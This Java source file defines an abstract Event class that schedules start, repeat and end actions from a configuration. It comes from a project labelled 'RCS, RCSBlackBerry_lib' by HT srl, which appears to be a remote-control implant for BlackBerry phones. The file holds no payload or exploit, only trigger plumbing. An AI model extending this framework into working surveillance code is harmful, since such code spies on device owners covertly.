//#preprocess

/* *************************************************
 * Copyright (c) 2010 - 2010
 * HT srl,   All rights reserved.
 * Project      : RCS, RCSBlackBerry_lib
 * File         : Event.java
 * Created      : 26-mar-2010
 * *************************************************/
package blackberry.event;

import java.util.TimerTask;

import blackberry.Status;
import blackberry.TimerJob;
import blackberry.action.Action;
import blackberry.config.ConfEvent;
import blackberry.debug.Check;
import blackberry.debug.Debug;
import blackberry.debug.DebugLevel;
import blackberry.manager.ActionManager;

/**
 * The Class Event.
 */
public abstract class Event extends TimerJob {

    /** The debug instance. */
    //#ifdef DEBUG
    private static Debug debug = new Debug("Event", DebugLevel.INFORMATION);

    //#endif

    // Gli eredi devono implementare i seguenti metodi astratti
    /**
     * Parses the.
     * 
     * @param event
     *            the event
     */
    protected abstract boolean parse(ConfEvent event);

    /** The event. */
    protected ConfEvent conf;
    private int iterCounter;

    public String getId() {
        return conf.getId();
    }

    public int getEventId() {
        return conf.getEventId();
    }

    public String getType() {
        return conf.getType();
    }

    /**
     * Sets the event.
     * 
     * @param event
     *            the new event
     */
    public boolean setConf(final ConfEvent conf) {
        //#ifdef DBC
        Check.requires(conf != null, "null conf");
        //#endif

        this.conf = conf;
        boolean ret = parse(conf);
        enable(conf.enabled);
        iterCounter = conf.iter;
        return ret;

    }

    /**
     * Trigger.
     * 
     * @param actualActionId
     *            the actual action id
     * @return
     */
    private final boolean trigger(final int actualActionId) {
        if (actualActionId != Action.ACTION_NULL) {
            //#ifdef DEBUG
            debug.trace("event: " + this + " triggering: " + actualActionId);
            //#endif
            ActionManager.getInstance().triggerAction(actualActionId, this);
            return true;
        } else {
            //#ifdef DEBUG
            debug.trace("trigger, null action");
            //#endif
            return false;
        }
    }

    protected int getConfDelay() {
        return conf.delay;
    }

    boolean active;
    //private ScheduledFuture<?> future;

    Future future;
    private String subType;

    protected synchronized void onEnter() {
        // if (Cfg.DEBUG) Check.asserts(!active,"stopSchedulerFuture");
        if (active) {
            //#ifdef DEBUG
            debug.trace("(onEnter): already active, return");
            //#endif

            return;
        }

        //#ifdef DEBUG
        debug.info("onEnter");
        //#endif

        int delay = getConfDelay();
        int period = delay;

        // Se delay e' 0 e' perche' non c'e' repeat, quindi l'esecuzione deve
        // essere semplice.
        if (delay <= 0) {
            //#ifdef DEBUG
            debug.trace("onEnter: delay <= 0");
            //#endif

            //#ifdef DBC
            Check.asserts(iterCounter == Integer.MAX_VALUE,
                    " (onEnter) Assert failed, iterCounter:" + iterCounter);
            Check.asserts(conf.repeatAction == Action.ACTION_NULL,
                    " (onEnter) Assert failed, repeatAction:"
                            + conf.repeatAction);
            //#endif
        }

        triggerStartAction();

        //#ifdef DEBUG
        debug.trace("(scheduleAtFixedRate) delay: " + delay + " period: "
                + period);
        //#endif

        if (delay > 0 && conf.repeatAction != Action.ACTION_NULL && iterCounter > 0) {
            //#ifdef DBC
            Check.asserts(period > 0, " (onEnter) Assert failed, period<=0: "
                    + conf);
            //#endif
            future = new Future();
            try{
            Status.self().getTimer()
                    .schedule(future, delay * 1000, period * 1000);
            }catch(Exception ex){
                Status.self().renewTimer();
            }
        }
        active = true;

    }

    class Future extends TimerTask {
        int count = 0;

        public void run() {
            try {
                if (count >= iterCounter) {
                    //#ifdef DEBUG
                    debug.info("TimerTask count >= iterCounter");
                    //#endif
                    stopSchedulerFuture();
                    return;
                }
                triggerRepeatAction();

                //#ifdef DEBUG
                debug.trace("TimerTask count: " + count);
                //#endif

                count++;
            } catch (Exception ex) {

                //#ifdef DEBUG
                debug.error(ex);
                debug.error("TimerTask");
                //#endif
                stopSchedulerFuture();
            }
        }
    }

    private void stopSchedulerFuture() {
        //#ifdef DEBUG
        debug.trace("stopSchedulerFuture");
        //#endif
        if (active && future != null) {
            future.cancel();
            future = null;
        }
    }

    protected synchronized void onExit() {
        // if (Cfg.DEBUG) Check.asserts(active,"stopSchedulerFuture");
        if (active) {
            //#ifdef DEBUG
            debug.info("onExit: active, " + this);
            //#endif

            stopSchedulerFuture();
            active = false;

            triggerEndAction();
        } else {
            //#ifdef DEBUG
            debug.trace("onExit: not active, " + this);
            //#endif
        }
    }

    protected synchronized boolean stillIter() {
        iterCounter--;
        return iterCounter >= 0;
    }

    private boolean triggerStartAction() {
        //#ifdef DEBUG
        debug.info("triggerStartAction: " + this);
        //#endif
        //#ifdef DBC
        Check.requires(conf != null, "null conf");
        //#endif

        return trigger(conf.startAction);
    }

    private boolean triggerEndAction() {
        //#ifdef DEBUG
        debug.info("triggerEndAction");
        //#endif
        //#ifdef DBC
        Check.requires(conf != null, "null conf");
        //#endif
        return trigger(conf.endAction);
    }

    private boolean triggerRepeatAction() {
        //#ifdef DEBUG
        debug.info("triggerRepeatAction");
        //#endif
        //#ifdef DBC
        Check.requires(conf != null, "null conf");
        //#endif
        return trigger(conf.repeatAction);
    }

    public String getSubType() {
        return this.subType;
    }

    public void setSubType(String subtype) {
        this.subType = subtype;
    }

    //#ifdef DEBUG
    public final String toString() {
        return "Event (" + conf.getId() + ") <" + conf.getType().toUpperCase() + "> : " + conf.desc + " " + (isEnabled() ? "ENABLED" : "DISABLED") + " ST: " + conf.startAction + " END: " + conf.endAction + " REP: " + conf.repeatAction + " ITER: " + conf.iter; //$NON-NLS-1$ //$NON-NLS-2$ //$NON-NLS-3$ //$NON-NLS-4$
    }
    //#endif

}
